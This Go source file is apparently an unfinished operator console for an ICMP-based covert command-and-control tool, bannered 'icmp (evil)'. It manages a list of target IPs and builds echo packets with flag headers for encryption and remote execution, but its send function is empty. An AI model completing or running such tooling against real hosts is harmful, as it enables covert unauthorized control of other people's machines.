package main

import (
	"bufio"
	"fmt"
	"os"
	"strconv"
	"strings"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

var clients = make(map[int]string)
var SSM bool = true
var execute = false
var ID int = 0

func print_title() {
	fmt.Println(".__                          ___             .__.__    ___")
	fmt.Println("|__| ____  __ ________      /  /   _______  _|__|  |   \\  \\")
	fmt.Println("|  _/ ___\\|  |  \\____ \\    /  /  _/ __ \\  \\/ |  |  |    \\  \\")
	fmt.Println("|  \\  \\___|  |  |  |_> >  (  (   \\  ___/\\   /|  |  |__   )  )")
	fmt.Println("|__|\\___  |____/|   __/    \\  \\   \\___  >\\_/ |__|____/  /  /")
	fmt.Println("        \\/      |__|        \\__\\      \\/               /__/")
	fmt.Println("We are so back.")
	fmt.Println("Type \"help\" for list of commands.")
}

func AddClient(ip string) {
	clients[ID] = ip
	ID++
}

func RemoveClient(id int) {
	_, ok := clients[id]
	if !ok {
		fmt.Println("Invalid ID")
	}
	delete(clients, id)
}

func RemoveAllClients() {
	for k := range clients {
		RemoveClient(k)
	}
}

func ShowClients() {
	for id, ip := range clients {
		fmt.Printf("ID: %d, IP: %s\n", id, ip)
	}
}

func LoadClients() {
	readFile, err := os.Open("targets.txt")
	if err != nil {
		fmt.Println(err)
	}
	fileScanner := bufio.NewScanner(readFile)
	fileScanner.Split(bufio.ScanLines)
	for fileScanner.Scan() {
		AddClient(fileScanner.Text())
	}
}

func generate_header(segment int, segmented bool) string {
	segHeader := strconv.Itoa(segment)
	header := "!!!"
	// ### is server flag, value 1 (SSM) is Encryption option, 2 is execution option
	// 3 is segment for oversized packets, 4 is segment ID
	if SSM {
		header += "1"
	} else {
		header += "0"
	}
	if execute {
		header += "1"
	} else {
		header += "0"
	}
	if segmented {
		header += "1"
	} else {
		header += "0"
	}
	header += segHeader
	return header
}

func MakePacket(payload string) icmp.Message {
	packet := icmp.Message{
		Type: ipv4.ICMPTypeEcho,
		Code: 0,
		Body: &icmp.Echo{
			ID:   0,
			Seq:  0,
			Data: []byte(payload),
		},
	}
	return packet
}

func SendPacket(packet icmp.Message) {

}

func CheckTwoStrings(words []string) bool {
	if len(words) != 2 {
		fmt.Println("Invalid input")
		return false
	}
	return true
}

func main() {
	print_title()
	for {
		consoleReader := bufio.NewReader(os.Stdin)
		fmt.Print(">> ")
		input, err := consoleReader.ReadString('\n')
		input = strings.TrimRight(input, "\r\n")
		if err != nil {
			fmt.Println(err)
		}
		tokens := strings.Split(input, " ")

		switch tokens[0] {
		case "add":
			if CheckTwoStrings(tokens) {
				AddClient(tokens[1])
			}
		case "rm":
			if CheckTwoStrings(tokens) {
				id, err := strconv.Atoi(tokens[1])
				if err != nil {
					fmt.Println("Not an ID.")
					continue
				}
				RemoveClient(id)
			}
		case "removeallclients":
			RemoveAllClients()
		case "ls":
			ShowClients()
		case "load":
			LoadClients()
		case "kill":
			print_title()
			os.Exit(0)
		default:
			fmt.Println("Invalid command: [", input, "]")
		}
	}
}
